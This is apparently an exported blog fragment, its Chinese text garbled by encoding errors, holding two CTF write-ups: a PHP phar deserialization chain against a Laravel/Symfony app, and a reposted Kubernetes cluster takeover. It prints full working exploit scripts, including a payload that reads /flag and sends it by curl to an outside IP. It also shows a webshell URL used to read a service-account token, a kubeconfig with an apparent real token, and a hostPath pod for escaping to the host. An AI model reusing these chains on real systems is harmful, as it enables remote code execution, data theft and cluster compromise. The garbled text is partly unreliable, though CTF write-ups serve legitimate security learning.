æ–¹æ³•ä¸­ call_user_func å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°éƒ½å¯æŽ§\næ¡ä»¶æ¢³ç†\n\nImportConfigurator-&gt;parent = ValidGenerator ç±»\nValidGenerator-&gt;maxRetries = 1\nValidGenerator-&gt;generator = DefaultGenerator ç±»\nDefaultGenerator-&gt;default = [ä»»æ„å¯æŽ§å‡½æ•°å‚æ•°]\nValidGenerator-&gt;validator = [ä»»æ„å¯æŽ§å‡½æ•°åç§°]\n\nphar ååºåˆ—åŒ–phar ååºåˆ—åŒ–æ˜¯ BlackHat 2018 å…¬å¸ƒçš„ä¸€ç§ä¸éœ€è¦ unserialize å‡½æ•°å°±èƒ½è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•\nå› ä¸ºç™¾åº¦å‡ºæ¥çš„å¤åˆ¶æ¥å¤åˆ¶åŽ»éƒ½æ˜¯é‚£å‡ ç¯‡æ–‡ç« ï¼Œè¿™é‡Œé™„ä¸€ä»½ BlackHat 2018 çš„è®²ä¹‰\nPHAR æ–‡ä»¶æ˜¯ PHP Archieve çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯ç±»ä¼¼äºŽ Java çš„ JAR åŒ…çš„ä¸€ç§åŽ‹ç¼©æ–‡ä»¶\n\nPHP åœ¨è¯»å– PHAR æ–‡ä»¶çš„æ—¶å€™ä¼šå¯¹ .phar/.metadata.bin ä¸­çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–\n# exp1.phar.tar.gz/.phar/.metadata.bin\n\nO:64:\"Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator\":1:&#123;s:72:\" Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator parent\";O:20:\"Faker\\ValidGenerator\":3:&#123;s:12:\" * generator\";O:22:\"Faker\\DefaultGenerator\":1:&#123;s:10:\" * default\";s:34:\"echo \"&lt;?php phpinfo(); ?>\" > 1.php\";&#125;s:12:\" * validator\";s:6:\"system\";s:13:\" * maxRetries\";i:1;&#125;&#125;\n\nè€Œ .phar/stub.php æ˜¯ PHAR æ–‡ä»¶çš„ä¸€ä¸ªæ ‡å¿—ï¼Œå³ __HALT_COMPILER(); ?&gt;\n\nPHP ä¸ä¼šç†ä¼šè¿™ä¸ªæ ‡å¿—å‰é¢æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä»–åªç®¡æŠŠè¿™ä¸ªæ ‡å¿—åŽé¢çš„éƒ¨åˆ†ä½œä¸º PHAR åŒ…æ¥è§£æž\ntest.txt æ˜¯éšä¾¿ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæ˜¯ä¸€ä¸ªä¸ºäº†å®ŒæˆåŽ‹ç¼©è€Œéšæ„æž„é€ çš„ä¸œè¥¿ï¼ŒPHAR ååºåˆ—åŒ–çš„é‡ç‚¹ä¹Ÿä¸åœ¨è¿™é‡Œ 2333\nå› æ­¤åªè¦ PHP èƒ½ä»¥ phar:// åè®®è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬çš„ç›®çš„å°±è¾¾åˆ°äº†\nEXP&lt;?php\n\nnamespace Symfony\\Component\\Routing\\Loader\\Configurator&#123;\n    class ImportConfigurator&#123;\n        private $parent;\n        function __construct($c1)&#123;\n            $this->parent = $c1;\n        &#125;\n    &#125;\n&#125;\nnamespace Faker&#123;\n    class DefaultGenerator&#123;\n        protected $default;\n        function __construct($param)&#123;\n            $this->default = $param;\n        &#125;\n    &#125;\n    class ValidGenerator&#123;\n        protected $generator;\n        protected $validator;\n        protected $maxRetries;\n        function __construct($func,$param)&#123;\n            $this->generator = new DefaultGenerator($param);\n            $this->maxRetries = 1;\n            $this->validator = $func;\n        &#125;\n    &#125;\n&#125;\nnamespace&#123;\n    $phar = new Phar('exp1.phar');\n    \n    $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ);\n    \n    $phar->startBuffering();\n    $phar->setStub('&lt;?php __HALT_COMPILER();?>');\n    $phar->addFromString('test.txt', 'test');\n    $o = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator(\n        new Faker\\ValidGenerator('system','echo \"&lt;?php phpinfo(); ?>\" > 1.php')\n    );\n    $phar->setMetadata($o);\n    $phar->stopBuffering();\n    echo serialize($o);\n&#125;\n\nå› ä¸ºä¸Šä¼ æ–‡ä»¶æœ‰å¯¹ stub å’Œ php çš„è¿‡æ»¤ï¼ŒåŠ ä¸€è¡Œè¯­å¥åŽ‹ç¼©ä¸€ä¸‹å°±èƒ½è¿‡\nåŽ‹ç¼©åŽçš„æ–‡ä»¶å†…å®¹\n\nè¶³å¤ŸæŠ½è±¡äº†å§ 233\nç”Ÿæˆå‡ºæ¥çš„ exp1.phar.tar.gzï¼Œæ”¹åä¸º exp1.png\nP.S. å› ä¸º PHP 8 åœ¨é‡åˆ°å¼‚å¸¸çš„æ—¶å€™ä¼šä½œä¸ºé”™è¯¯å¤„ç†ï¼Œåœæ­¢æ‰§è¡Œä»£ç \næ‰€ä»¥å¦‚æžœé¢˜ç›®çŽ¯å¢ƒæ˜¯ PHP 8 å¥½åƒæ˜¯æ‰“ä¸é€šçš„ (æˆ‘æ˜¯ Manjaro ç¥žæ•™ï¼Œè¢«å‘äº†ä¸çŸ­æ—¶é—´ 2333)\n\nä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åŽè®¿é—®è·¯ç”± /index.php/image?image=phar://./uploads/xxxxxxx.png\n\n\nä¼šè¿”å›ž 500 é”™è¯¯ï¼Œæˆ‘å¼€äº† Laravel DEBUG æ‰€ä»¥é¡µé¢ä¸Šæœ‰è¯¦ç»†ä¿¡æ¯\nä½†æ˜¯ phar ååºåˆ—åŒ–å·²ç»æ‰§è¡Œäº†ï¼Œæ‰€ä»¥ä¼šåœ¨ public ç›®å½•ç”Ÿæˆä¸€ä¸ª 1.php\n\nè®¿é—® /1.php å³å¯\nå®˜æ–¹ç‰ˆæœ¬ EXPå‚è€ƒäº† ZeddYu å¸ˆå‚…çš„æŽ¨æ–‡ã€‚\næœ¬åœ°çŽ¯å¢ƒå’Œ Buu è¿œç¨‹çŽ¯å¢ƒä¸å¤ªä¸€æ ·ï¼Œæˆ‘çš„ EXP å¥½åƒæ²¡æ‰“é€šï¼Œå®˜æ–¹è§£ç”¨äº†å¦ä¸€æ¡é“¾ã€‚\næœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è·Ÿä¸€ä¸‹è¿™æ¡é“¾ã€‚\n&lt;?php\n\nnamespace Illuminate\\Bus &#123;\n    class Dispatcher\n    &#123;\n        protected $queueResolver;\n\n        function __construct()\n        &#123;\n            $this->queueResolver = [new \\Mockery\\Loader\\EvalLoader(), 'load'];\n        &#125;\n    &#125;\n&#125;\n\nnamespace Illuminate\\Broadcasting &#123;\n    class PendingBroadcast\n    &#123;\n        protected $events;\n        protected $event;\n\n        function __construct($evilCode)\n        &#123;\n            $this->events = new \\Illuminate\\Bus\\Dispatcher();\n            $this->event = new BroadcastEvent($evilCode);\n        &#125;\n    &#125;\n\n    class BroadcastEvent\n    &#123;\n        public $connection;\n\n        function __construct($evilCode)\n        &#123;\n            $this->connection = new \\Mockery\\Generator\\MockDefinition($evilCode);\n        &#125;\n\n    &#125;\n&#125;\n\nnamespace Illuminate\\Support &#123;\n    class MessageBag\n    &#123;\n        protected $messages = [];\n        protected $format;\n\n        function __construct($inner)\n        &#123;\n            $this->format = $inner;\n        &#125;\n    &#125;\n&#125;\n\nnamespace Mockery\\Loader &#123;\n    class EvalLoader\n    &#123;\n    &#125;\n&#125;\n\nnamespace Mockery\\Generator &#123;\n    class MockDefinition\n    &#123;\n        protected $config;\n        protected $code;\n\n        function __construct($evilCode)\n        &#123;\n            $this->code = $evilCode;\n            $this->config = new MockConfiguration();\n        &#125;\n    &#125;\n\n    class MockConfiguration\n    &#123;\n        protected $name = 'abcdefg';\n    &#125;\n&#125;\n\nnamespace &#123;\n    $code = '&lt;?php $s=base64_encode(file_get_contents(\"/flag\"));system(\"curl http://xx.xx.xx.xx:5555/?a=\".$s);exit; ?>';\n    $expected = new \\Illuminate\\Broadcasting\\PendingBroadcast($code);\n    $res = new \\Illuminate\\Support\\MessageBag($expected);\n\n    @unlink(\"exp2.phar.tar.gz\");\n    $phar = new Phar(\"exp2.phar\");\n    $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ);\n    $phar->startBuffering();\n    $phar->setStub(\"GIF89a&lt;?php __HALT_COMPILER();?>\");\n    $phar->setMetadata($res);\n    $phar->addFromString(\"test.txt\", \"test\");\n    $phar->stopBuffering();\n    echo serialize($res);\n&#125;\n\nHTTP2 èµ°ç§åŽŸæ¥ /index.php/image çœŸçš„æ˜¯éžé¢„æœŸã€‚\nZeddYu å¸ˆå‚…çš„æŽ¨æ–‡é‡Œæœ‰æåˆ° HTTP2 èµ°ç§æ‰æ˜¯é¢„æœŸè§£ã€‚\næˆ‘è¿™é‡Œè´´ä¸€ä¸‹ 4qE å‘ç»™æˆ‘çš„æ–‡ç« ï¼šBlackHatï¼šHTTP è¯·æ±‚èµ°ç§çš„æ–°å˜ä½“ã€æ–°é˜²å¾¡\nç­‰æˆ‘æŠŠèµ°ç§å¤çŽ°äº†å†æ›´æ–°åšå®¢ 233\n","categories":[],"tags":["CTF WriteUp"]},{"title":"åŽä¸ºäº‘ CTF cloud éžé¢„æœŸè§£ä¹‹ k8s æ¸—é€å®žæˆ˜","url":"/20201230/%E5%8D%8E%E4%B8%BA%E4%BA%91-CTF-cloud-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B9%8B-k8s-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/","content":"å‰è¨€è½¬è½½è‡ª Annevi\nå½“æ—¶æ‰“æ¯”èµ›çš„æ—¶å€™è§‰å¾—è¿™æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„è¿‡ç¨‹\nè½¬è½½è®°å½•ä¸€ä¸‹\n0x00 é¢˜ç›®å…¥å£å‘çŽ°æ‹¿åˆ°é¢˜ç›®å‘çŽ°æ˜¯ä¸€ä¸ªç±»ä¼¼äºŽæä¾›IaaSæœåŠ¡çš„ç«™ç‚¹ï¼Œæ‰«æäº†ä¸€æ³¢ç›®å½•ï¼Œå‘çŽ°å‡ ä¸ªæ–‡ä»¶ä»¥åŠè·¯ç”±:\nphpinfo.php\nrobots.txt\nadmin&#x2F;\nlogin&#x2F;\nstatic&#x2F;\n\næŒºå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªå­˜åœ¨phpinfoçš„çŽ¯å¢ƒä¸‹å‘çŽ°äº†ä¸€ä¸ªbeegoæ¡†æž¶åŽç«¯çš„403ç•Œé¢ï¼š\n\nåˆæ­¥çŒœæµ‹æ˜¯.phpçš„æ–‡ä»¶äº¤ç»™äº†nginx fastcgiè¿›è¡Œå¤„ç†ï¼Œè€Œå…¶ä»–è·¯ç”±åˆ™æ˜¯äº¤ç»™äº†beegoè¿›è¡Œå¤„ç†ã€‚\næŽ¥ç€æˆ‘ä»¬å…ˆçœ‹/adminè·¯ç”±ï¼Œå‘çŽ°å­˜åœ¨ä¸€ä¸ªéšè—çš„è¡¨å•\n\nå› æ­¤è‡ªç„¶çš„æƒ³åˆ°ä½¿ç”¨burpsuiteè¿›è¡Œå¼±å£ä»¤çš„çˆ†ç ´ï¼Œå‘çŽ°å­˜åœ¨å¼±å£ä»¤ admin:admin\nç™»å½•æˆåŠŸåŽè¿”å›žäº†ä¸¤ä¸ªurlï¼Œ ä¸‹è½½ tools.zipï¼ŒåŒæ—¶æ ¹æ®åå­—çŒœæµ‹/wsproxyæ˜¯ä¸€ä¸ªwebsocketçš„ä»£ç†è·¯ç”±ï¼Œè€ŒæŸ¥çœ‹toolsçš„æºç å‘çŽ°æ˜¯ä¸€ä¸ªwsproxyçš„å®¢æˆ·ç«¯ç¨‹åºã€‚\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†è¿›å…¥å†…ç½‘çš„é€šé“ã€‚\n0x01 wsproxy è¿›å…¥å†…ç½‘ç›´æŽ¥å¯¹æ‹¿åˆ°çš„toolsæºç è¿›è¡Œç¼–è¯‘ï¼ŒèŽ·å¾—å®¢æˆ·ç«¯è¿žæŽ¥ç¨‹åº\n\næ ¹æ®ä½¿ç”¨è¯´æ˜Žï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„å‘½ä»¤è¿žæŽ¥ä¸Šé¢˜ç›®çš„wsproxy,åŒæ—¶å¯†ç ä¸ºtoolsæºç ç›®å½•ä¸‹çš„ pass.txt(UAF)ï¼Œsessionå°±æ˜¯æˆ‘ä»¬ç™»é™†adminåŽï¼Œé¢˜ç›®ç»™çš„beego session\n\nè¿™æ ·ä¼šåœ¨æœ¬åœ°çš„1080ç«¯å£å¼€å¯ä¸€ä¸ª socks5 ä»£ç†ï¼Œé€šè¿‡è¿™ä¸ªä»£ç†ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¿žå…¥å†…ç½‘ã€‚\n0x02 phpinfoæ³„éœ²k8sé›†ç¾¤ä¿¡æ¯ç”±äºŽè¿™é“é¢˜ç›®çš„åç§° Cloudä»¥åŠåœ¨phpinfo.php çŽ¯å¢ƒå˜é‡ ä¸­å‘çŽ°çš„å¤§é‡serviceçš„ä¿¡æ¯ä»¥åŠk8s api-serveråœ°å€ï¼ŒåŒæ—¶æ ¹æ®çŽ¯å¢ƒå˜é‡çš„åç§°ä¸Žå€¼æ¥çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªk8sé›†ç¾¤ã€‚è€Œæˆ‘ä»¬çš„é¢˜ç›®å±žäºŽk8sé›†ç¾¤ä¸­çš„ä¸€ä¸ªpodã€‚\n\n0x03 k8såŸºç¡€æž¶æž„ä»‹ç»åœ¨ç»§ç»­æ·±å…¥ä¸‹åŽ»ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£k8sçš„ä¸€äº›åŸºç¡€æž¶æž„\n\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒKubernetesé›†ç¾¤ä¸»è¦åˆ†ä¸º Masterå’ŒNode ä¸¤éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯å…¸åž‹çš„åˆ†å¸ƒå¼æž¶æž„ã€‚\né¦–å…ˆï¼Œå¤–éƒ¨åº”ç”¨ç¨‹åºé€šè¿‡Api-Serveræä¾›çš„ HTTP æŽ¥å£ä¸ŽMasterè¿›è¡Œäº¤äº’ï¼Œè€Œåœ¨ä¸ŽAPIsè¿›è¡Œäº¤äº’å‰ï¼Œéœ€è¦ç»è¿‡ä¸€æ­¥è®¤è¯çš„é˜¶æ®µã€‚è€Œ Nodeç”±å¤šä¸ªpodç»„æˆï¼Œpodä¸­è¿è¡Œç€çš„ä¾¿æ˜¯å¤§å®¶æ¯”è¾ƒç†Ÿæ‚‰çš„å®¹å™¨(é€šå¸¸æ¥è¯´æ˜¯docker)ï¼Œç¼–å†™çš„æœåŠ¡(app)å°±è¿è¡Œåœ¨è¿™äº›podä¸­çš„å®¹å™¨å†…ã€‚\nå…¶æ¬¡ï¼Œæˆ‘ä»¬è‹¥æ˜¯æƒ³å°†æˆ‘ä»¬çš„podå‘å¸ƒå‡ºåŽ»ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«å…¬å¼€è®¿é—®ï¼Œå°±éœ€è¦äº†è§£æœåŠ¡(Service)ã€‚æˆ‘ä»¬å°†è¿è¡Œåœ¨ä¸€ç»„ Pods ä¸Šçš„åº”ç”¨ç¨‹åºå…¬å¼€ä¸ºç½‘ç»œæœåŠ¡çš„æŠ½è±¡æ–¹æ³•ç§°ä½œæœåŠ¡ï¼ŒæœåŠ¡ä¸Šä¸€èˆ¬é…ç½®äº†èƒ½å¤Ÿè¢«å…¬å¼€è®¿é—®çš„ ipåœ°å€ã€ç«¯å£æ˜ å°„å…³ç³»ç­‰ï¼Œé€šè¿‡æœåŠ¡æˆ‘ä»¬å°±èƒ½å¤Ÿè®¿é—®åˆ°ç›¸åº”çš„podsã€‚\næ¯ä¸€ä¸ªNodeä¸Šéƒ½æœ‰ä¸€ä¸ªè¢«ç§°ä½œèŠ‚ç‚¹ä»£ç†çš„ç¨‹åº kubeletï¼ŒNodeé€šè¿‡è¯¥ç¨‹åºå‘Api-Serveræ±‡æŠ¥èŠ‚ç‚¹ä¿¡æ¯ï¼Œä»¥åŠæŽ¥å—ç›¸åº”çš„æŒ‡ä»¤ç­‰ã€‚\nä»Žä¸Šé¢çš„æž¶æž„ä¸­ä¸éš¾çœ‹å‡ºï¼Œå¦‚æžœæˆ‘ä»¬è¦æ‹¿ä¸‹æ•´ä¸ªé›†ç¾¤ï¼Œä»Žå¤–éƒ¨çœ‹å®žé™…ä¸Šå°±æ˜¯éœ€è¦èŽ·å¾—æš´éœ²åœ¨å¤–çš„api-serveræä¾›çš„REST apiçš„è®¿é—®æƒé™ã€‚\n0x04 k8s è®¤è¯ token æ³„éœ² + é…ç½®ä¸å½“é€šè¿‡ä¸Šé¢ä¸€æ­¥æµ…æ˜¾çš„è§£äº†ä¸€ä¸‹k8sçš„åŸºç¡€æž¶æž„ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ã€‚\næˆ‘ä»¬é€šè¿‡ç»™çš„ä»£ç†ç¨‹åºè¿žæŽ¥å†…ç½‘ï¼Œè®¿é—®phpinfoä¸­æ³„éœ²çš„ k8s api-server https://10.247.0.1:443ï¼Œå‘çŽ°api-serverå±…ç„¶æš´éœ²åœ¨ä»£ç†èƒ½å¤Ÿç›´æŽ¥è®¿é—®åˆ°çš„ç½‘æ®µä¸Šï¼Œä½†æ˜¯ç›´æŽ¥è®¿é—®æç¤ºæˆ‘ä»¬401æœªæŽˆæƒï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç§å¯èƒ½çš„æ–¹å¼åŽ»é€šè¿‡æ­¤è®¤è¯ã€‚\n\næ ¹æ®phpinfo.phpæ–‡ä»¶ä¸­çš„å†…å®¹æ¥çœ‹ï¼Œè¯¥é›†ç¾¤ä¸­éƒ¨ç½²äº†å¾ˆå¤šå¾ˆå¤šçš„servicesï¼Œå› æ­¤æˆ‘ä»¬çŒœæµ‹æ‰€æœ‰çš„é¢˜ç›®å®¹å™¨åº”è¯¥éƒ½æ˜¯é€šè¿‡è¿™ä¸ªk8sè¿›è¡Œç¼–æŽ’ç®¡ç†çš„ã€‚\nåŒæ—¶ç”±äºŽk8sé›†ç¾¤éƒ¨ç½²çš„æ—¶å€™é»˜è®¤ä¼šåœ¨æ¯ä¸ªpodå®¹å™¨ä¸­æŒ‚è½½tokenæ–‡ä»¶åˆ°/run/secrets/kubernetes.io/serviceaccount/tokenæ–‡ä»¶ä¸­ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–é¢˜ç›®æ‰€æ‹¿åˆ°çš„shellæ‹¿åˆ°è¿™ä¸ªtokenã€‚\n\nServiceAccount ä¸»è¦åŒ…å«äº†ä¸‰ä¸ªå†…å®¹ï¼šnamespaceã€Token å’Œ CAã€‚namespace æŒ‡å®šäº† pod æ‰€åœ¨çš„ namespaceï¼ŒCA ç”¨äºŽéªŒè¯ apiserver çš„è¯ä¹¦ï¼Œtoken ç”¨ä½œèº«ä»½éªŒè¯ã€‚å®ƒä»¬éƒ½é€šè¿‡ mount çš„æ–¹å¼ä¿å­˜åœ¨ pod çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå…¶ä¸­ token ä¿å­˜çš„è·¯å¾„æ˜¯ /var/run/secrets/kubernetes.io/serviceaccount/token ï¼Œæ˜¯ apiserver é€šè¿‡ç§é’¥ç­¾å‘ token çš„ base64 ç¼–ç åŽçš„ç»“æžœ\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡ä¹‹å‰åœ¨ webshell_1é¢˜ç›®æ‰€æ‹¿åˆ°çš„webshellï¼ŒèŽ·å–åˆ°api-serverè®¤è¯token\nhttp:&#x2F;&#x2F;124.70.199.12:32003&#x2F;upload&#x2F;71a6e9b8-90b6-4d4f-9acd-bd91c8bbcc5e.jsp?pwd&#x3D;023&amp;i&#x3D;cat%20&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token\n\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»èŽ·å¾—äº†api-serverçš„è®¿é—®æƒé™ï¼Œå› æ­¤å°±ç›¸å½“äºŽæˆ‘ä»¬èŽ·å–äº†k8sé›†ç¾¤ä¸­çš„masteræƒé™ã€‚\n0x05 èŽ·å–é›†ç¾¤æ“çºµæƒé™æ‹¿åˆ°äº†api-serverçš„æƒé™ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿéšå¿ƒæ‰€æ¬²çš„åœ¨é›†ç¾¤ä¸­åšæƒ³åšçš„äº‹äº†~ å…¶å®žåšåˆ°è¿™ä¸€æ­¥ï¼Œå¤§æ¦‚å°±æ„è¯†åˆ°è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¹³å°æ¼æ´žï¼Œè€Œä¸æ˜¯æœ¬é¢˜çš„é¢„æœŸè§£æ³•ã€‚å› ä¸ºæ‹¿åˆ°äº†masteræƒé™ä¹‹åŽï¼Œæˆ‘ä»¬å·²ç»èƒ½å¤ŸæŸ¥çœ‹/æŽ§åˆ¶æ‰€æœ‰çš„Pods(webé¢˜ç›®)ï¼Œéšæ„çš„èŽ·å–æˆ‘ä»¬æƒ³è¦é¢˜ç›®çš„flagã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œå·¥å…· kubectlæ¥å¯¹api-serverè¿›è¡Œæ“ä½œã€‚\nåˆ›å»ºä¸€ä¸ªk8s.yamlé…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼Œtokenå¤„ä¸ºæˆ‘ä»¬ä¸Šé¢æ‹¿åˆ°çš„tokenï¼Œserveråˆ™å¡«å†™ api-serverçš„åœ°å€\napiVersion: v1\nclusters:\n- cluster:\n    insecure-skip-tls-verify: true\n    server: https:&#x2F;&#x2F;10.247.0.1\n  name: cluster-name\ncontexts:\n- context:\n    cluster: cluster-name\n    namespace: test\n    user: admin\n  name: admin\ncurrent-context: admin\nkind: Config\npreferences: &#123;&#125;\nusers:\n- name: admin\n  user:\n    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w\n\nåœ¨æœ¬æœºé€šè¿‡é¢˜ç›®çš„å†…ç½‘ä»£ç† æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿œç¨‹è¿žæŽ¥è¿›å…¥é¢˜ç›®çš„k8sé›†ç¾¤ï¼ŒæˆåŠŸé€šè¿‡è®¤è¯ã€‚\nkubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true\n\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†è®¿é—®k8s api-serverçš„æƒé™ï¼Œä¸‹é¢æˆ‘ä»¬å°è¯•åŽ»èŽ·å–é›†ç¾¤masterå®¿ä¸»æœºçš„æƒé™ã€‚\né€šè¿‡æ‰§è¡Œ\nkubectl --kubeconfig k8s.yaml version --insecure-skip-tls-verify&#x3D;true\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œk8sçš„ç‰ˆæœ¬å·ä¸º v1.15.11ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„k8sæŽˆæƒé»˜è®¤æ˜¯ä¸ä¼šå¼€å¯RBAC(åŸºäºŽè§’è‰²çš„è®¿é—®æŽ§åˆ¶)çš„ã€‚\n\nåœ¨Kubernetesä¸­ï¼ŒæŽˆæƒæœ‰ABACï¼ˆåŸºäºŽå±žæ€§çš„è®¿é—®æŽ§åˆ¶ï¼‰ã€RBACï¼ˆåŸºäºŽè§’è‰²çš„è®¿é—®æŽ§åˆ¶ï¼‰ã€Webhookã€Nodeã€AlwaysDenyï¼ˆä¸€ç›´æ‹’ç»ï¼‰å’ŒAlwaysAllowï¼ˆä¸€ç›´å…è®¸ï¼‰è¿™6ç§æ¨¡å¼ã€‚ä»Ž1.6ç‰ˆæœ¬èµ·ï¼ŒKubernetes é»˜è®¤å¯ç”¨RBACè®¿é—®æŽ§åˆ¶ç­–ç•¥ã€‚ä»Ž1.8å¼€å§‹ï¼ŒRBACå·²ä½œä¸ºç¨³å®šçš„åŠŸèƒ½ã€‚\n\nå› æ­¤å¦‚æžœè¿ç»´åœ¨æ­å»ºé›†ç¾¤çŽ¯å¢ƒçš„æ—¶å€™ï¼Œæ²¡æœ‰è®¾ç½® --authorization-mode=RBAC ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‹¿ä¸‹é›†ç¾¤ä¸­çš„ä¸€ä¸ªpodçš„shellï¼Œä»Žè€ŒèŽ·å–åˆ°tokenè¿›è¡Œapi-serverçš„è®¤è¯ã€‚å¾ˆæ˜¾ç„¶ï¼Œç»è¿‡ä¸Šé¢çš„éªŒè¯ï¼Œè¿ç»´åœ¨éƒ¨ç½²çŽ¯å¢ƒæ—¶å¹¶æ²¡æœ‰å¼€å¯è¯¥è®¿é—®æŽ§åˆ¶ã€‚\n0x06 èŽ·å–master å®¿ä¸»æœºæƒé™æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„podï¼Œé€šè¿‡æ–‡ä»¶æŒ‚è½½çš„æ–¹å¼ï¼Œå°†å®¿ä¸»æœºæ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶æŒ‚è½½åˆ°podä¸­ï¼Œä½†æ˜¯ç”±äºŽåˆ›å»ºpodæ—¶ï¼Œéœ€è¦ä»Žè¿œç¨‹åœ°å€ä¸Šæ‹‰å–é•œåƒï¼Œè€Œè¯¥é¢˜å†…ç½‘è²Œä¼¼æ˜¯æ— æ³•å‡ºç½‘çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå·²ç»æ‹‰å–ä¸‹æ¥çš„æœ¬åœ°é•œåƒæ–‡ä»¶ã€‚\næ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒèŽ·å–å½“å‰å·²ç»æ‹‰å–è¿‡çš„images:\nkubectl --kubeconfig k8s.yaml get pods --all-namespaces --insecure-skip-tls-verify&#x3D;true -o jsonpath&#x3D;&quot;&#123;..image&#125;&quot; |\\\ntr -s &#39;[[:space:]]&#39; &#39;\\n&#39; |\\\nsort |\\\nuniq -c\n\nç»“æžœå¦‚ä¸‹ï¼š\n\nå°è¯•å‡ ä¸ªé•œåƒåŽï¼Œå‘çŽ° 100.125.4.222:20202/hwofficial/coredns:1.15.6æ˜¯å¯ä»¥ä½¿ç”¨çš„\nyamlé…ç½®å¦‚ä¸‹ï¼š\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-444\nspec:\n  containers:\n  - name: test-444\n    image: 100.125.4.222:20202&#x2F;hwofficial&#x2F;coredns:1.15.6\n    volumeMounts:\n    - name: host\n      mountPath: &#x2F;host\n  volumes:\n  - name: host\n    hostPath:\n      path: &#x2F;\n      type: Directory\n\nä¸Šè¿°é…ç½®å°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°äº†æˆ‘ä»¬podä¸­çš„ /hostç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤åœ¨defaultå‘½åç©ºé—´ä¸­åˆ›å»ºè¯¥pod\nkubectl --kubeconfig k8s.yaml apply -f pod.yaml -n default --insecure-skip-tls-verify&#x3D;true\n\nå†é€šè¿‡kubectl exec è¿›å…¥æˆ‘ä»¬çš„podä¸­ï¼Œä»¥å®žçŽ°å¯¹å®¿ä¸»æœºæ–‡ä»¶çš„æŽ§åˆ¶ã€‚\nkubectl --kubeconfig k8s.yaml exec -it test-444 bash -n default 